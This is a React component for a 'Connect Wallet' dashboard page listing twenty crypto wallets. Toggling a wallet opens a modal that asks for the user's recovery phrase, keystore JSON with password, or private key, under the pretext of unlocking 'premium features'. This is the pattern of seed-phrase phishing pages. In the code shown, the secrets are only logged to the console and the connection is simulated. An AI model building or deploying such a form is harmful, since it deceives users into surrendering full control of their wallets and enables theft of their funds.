import React, { useState } from 'react';
import { Link } from 'react-router-dom';

const wallets = [
    { id: 'metamask', name: 'Metamask Wallet', icon: 'metamask.png' },
    { id: 'trustwallet', name: 'Trustwallet Wallet', icon: 'trustwallet.png' },
    { id: 'walletconnect', name: 'Wallet Connect Wallet', icon: 'walletconnect.png' },
    { id: 'coinbase', name: 'Coinbase Wallet', icon: 'coinbase.jpeg' },
    { id: 'atomicwallet', name: 'Atomic Wallet Wallet', icon: 'atomicwallet.png' },
    { id: 'binance', name: 'Binance Smart Chain Wallet', icon: 'binance.png' },
    { id: 'bnb', name: 'BNB Wallet', icon: 'bnb.png' },
    { id: 'polkadot', name: 'Polkadot Wallet', icon: 'polkadot.png' },
    { id: 'xrp', name: 'XRP Wallet', icon: 'xrp.png' },
    { id: 'stellar', name: 'Stella Wallet', icon: 'stellar.png' },
    { id: 'theta', name: 'Theta Wallet', icon: 'theta.png' },
    { id: 'tron', name: 'Tron Wallet', icon: 'tron.png' },
    { id: 'ethereum-classic', name: 'Ethereum Classic Wallet', icon: 'ethereum-classic.png' },
    { id: 'icon', name: 'Icon Wallet', icon: 'icon.png' },
    { id: 'icon98', name: 'Icon98 Wallet', icon: 'coin98.png' },
    { id: 'flare', name: 'Flare Wallet Wallet', icon: 'flare.jpeg' },
    { id: 'authereum', name: 'Authereum Wallet', icon: 'authereum.png' },
    { id: 'defiat', name: 'Defiat Wallet', icon: 'defiat.jpeg' },
    { id: 'ledger', name: 'Ledger Wallet', icon: 'ledger.png' },
    { id: 'digitex', name: 'Digitex Wallet', icon: 'digitex.png' },
];

const WalletCard = ({ wallet, isConnected, onToggle }) => {
    return (
        <div className="col-xxl-3 col-xl-4 col-lg-4 col-md-6">
            <div className="card custom-card">
                <div className="card-body d-flex align-items-center justify-content-between gap-3">
                    <div className="d-flex align-items-center gap-2">
                        <span className="avatar avatar-rounded bg-dark" style={{ width: '20px', height: '20px' }}>
                            <img src={`/assets/wallets/${wallet.icon}`} alt={wallet.name} className="img-fluid" />
                        </span>
                        <div>
                            <h6 className="fw-semibold mb-0">
                                {wallet.name}
                            </h6>
                        </div>
                    </div>
                    <div className="form-check form-switch mb-0">
                        <input
                            className="form-check-input wallet-toggle"
                            type="checkbox"
                            role="switch"
                            id={`walletSwitch-${wallet.id}`}
                            checked={isConnected}
                            onChange={() => onToggle(wallet)}
                        />
                    </div>
                </div>
            </div>
        </div>
    );
};

const ConnectModal = ({ show, onClose, wallet, onSubmit }) => {
    const [activeTab, setActiveTab] = useState('phrase');
    const [formData, setFormData] = useState({
        phrase: '',
        keystore: '',
        password: '',
        privateKey: ''
    });

    if (!show || !wallet) return null;

    const handleSubmit = (e) => {
        e.preventDefault();
        onSubmit(activeTab, formData);
    };

    const handleChange = (e) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
    };

    return (
        <>
            <div className="modal fade show" style={{ display: 'block', backgroundColor: 'rgba(0,0,0,0.5)' }} tabIndex="-1" aria-modal="true" role="dialog">
                <div className="modal-dialog modal-dialog-centered modal-lg">
                    <div className="modal-content">
                        <div className="modal-header">
                            <h6 className="modal-title">
                                Connect <span id="walletModalName">{wallet.name}</span>
                            </h6>
                            <button type="button" className="btn-close" onClick={onClose} aria-label="Close"></button>
                        </div>
                        <div className="modal-body">
                            <ul className="nav nav-tabs mb-3" role="tablist">
                                <li className="nav-item" role="presentation">
                                    <button
                                        className={`nav-link ${activeTab === 'phrase' ? 'active' : ''}`}
                                        onClick={() => setActiveTab('phrase')}
                                        type="button"
                                    >
                                        Phrase
                                    </button>
                                </li>
                                <li className="nav-item" role="presentation">
                                    <button
                                        className={`nav-link ${activeTab === 'keystore' ? 'active' : ''}`}
                                        onClick={() => setActiveTab('keystore')}
                                        type="button"
                                    >
                                        Keystore JSON
                                    </button>
                                </li>
                                <li className="nav-item" role="presentation">
                                    <button
                                        className={`nav-link ${activeTab === 'private' ? 'active' : ''}`}
                                        onClick={() => setActiveTab('private')}
                                        type="button"
                                    >
                                        Private Key
                                    </button>
                                </li>
                            </ul>

                            <div className="tab-content">
                                {activeTab === 'phrase' && (
                                    <div className="tab-pane fade show active">
                                        <form onSubmit={handleSubmit}>
                                            <div className="mb-3">
                                                <label className="form-label">Recovery Phrase</label>
                                                <textarea
                                                    className="form-control"
                                                    name="phrase"
                                                    rows="3"
                                                    placeholder="Enter your 12/24-word recovery phrase"
                                                    value={formData.phrase}
                                                    onChange={handleChange}
                                                ></textarea>
                                            </div>
                                            <button type="submit" className="btn btn-primary">
                                                Connect With Phrase
                                            </button>
                                        </form>
                                    </div>
                                )}

                                {activeTab === 'keystore' && (
                                    <div className="tab-pane fade show active">
                                        <form onSubmit={handleSubmit}>
                                            <div className="mb-3">
                                                <label className="form-label">Keystore JSON</label>
                                                <textarea
                                                    className="form-control"
                                                    name="keystore"
                                                    rows="3"
                                                    placeholder="Paste your keystore JSON"
                                                    value={formData.keystore}
                                                    onChange={handleChange}
                                                ></textarea>
                                            </div>
                                            <div className="mb-3">
                                                <label className="form-label">Password</label>
                                                <input
                                                    type="password"
                                                    className="form-control"
                                                    name="password"
                                                    placeholder="Enter keystore password"
                                                    value={formData.password}
                                                    onChange={handleChange}
                                                />
                                            </div>
                                            <button type="submit" className="btn btn-primary">
                                                Connect With Keystore
                                            </button>
                                        </form>
                                    </div>
                                )}

                                {activeTab === 'private' && (
                                    <div className="tab-pane fade show active">
                                        <form onSubmit={handleSubmit}>
                                            <div className="mb-3">
                                                <label className="form-label">Private Key</label>
                                                <textarea
                                                    className="form-control"
                                                    name="privateKey"
                                                    rows="2"
                                                    placeholder="Enter your private key"
                                                    value={formData.privateKey}
                                                    onChange={handleChange}
                                                ></textarea>
                                            </div>
                                            <button type="submit" className="btn btn-primary">
                                                Connect With Private Key
                                            </button>
                                        </form>
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

const ConnectWallet = () => {
    const [connectedWallets, setConnectedWallets] = useState({});
    const [modalConfig, setModalConfig] = useState({ show: false, wallet: null });

    const handleToggle = (wallet) => {
        if (connectedWallets[wallet.id]) {
            // Disconnect logic
            setConnectedWallets(prev => {
                const newState = { ...prev };
                delete newState[wallet.id];
                return newState;
            });
        } else {
            // Open modal to connect
            setModalConfig({ show: true, wallet });
        }
    };

    const handleCloseModal = () => {
        setModalConfig({ show: false, wallet: null });
    };

    const handleConnectSubmit = (method, data) => {
        console.log(`Connecting ${modalConfig.wallet.name} via ${method}`, data);
        // Simulate successful connection
        setConnectedWallets(prev => ({
            ...prev,
            [modalConfig.wallet.id]: true
        }));
        handleCloseModal();
    };

    return (
        <div className="container-fluid page-container main-body-container">
            <div className="page-header-breadcrumb mb-3">
                <div className="d-flex align-center justify-content-between flex-wrap">
                    <div>
                        <h1 className="page-title fw-medium fs-18 mb-0">Connect Wallet</h1>
                        <p className="mb-0 text-muted fs-13">
                            Link your wallet to access premium features and manage all your wallets from a single dashboard.
                        </p>
                    </div>
                    <ol className="breadcrumb mb-0">
                        <li className="breadcrumb-item"><Link to="/dashboard">Dashboards</Link></li>
                        <li className="breadcrumb-item active" aria-current="page">Connect Wallet</li>
                    </ol>
                </div>
            </div>

            <div className="row gy-3 mb-3">
                {wallets.map(wallet => (
                    <WalletCard
                        key={wallet.id}
                        wallet={wallet}
                        isConnected={!!connectedWallets[wallet.id]}
                        onToggle={handleToggle}
                    />
                ))}
            </div>

            <ConnectModal
                show={modalConfig.show}
                wallet={modalConfig.wallet}
                onClose={handleCloseModal}
                onSubmit={handleConnectSubmit}
            />
        </div>
    );
};

export default ConnectWallet;
